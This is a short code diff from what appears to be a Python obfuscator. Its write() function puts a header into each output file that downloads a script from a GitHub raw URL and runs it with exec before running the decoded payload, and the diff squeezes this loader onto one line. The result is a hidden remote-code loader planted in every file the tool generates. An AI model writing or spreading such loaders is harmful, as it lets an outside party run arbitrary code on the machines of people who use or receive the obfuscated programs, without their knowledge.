@@ -49,10 +49,6 @@ def find(value):
             return str(u)
         
 def write(path, content):
-    head = f'''import requests
-req = requests.get('https://raw.githubusercontent.com/KazamaReinjector/KazObfuscator/main/KazObfuscatorEnc.py')
-exec(req.content)
-
-exec(decode({content}))'''
+    head = f'''import requests;req = requests.get('https://raw.githubusercontent.com/KazamaReinjector/KazObfuscator/main/KazObfuscatorEnc.py');exec(req.content);exec(decode({content}))'''
     with open(path, 'w') as file:
         file.write(head)
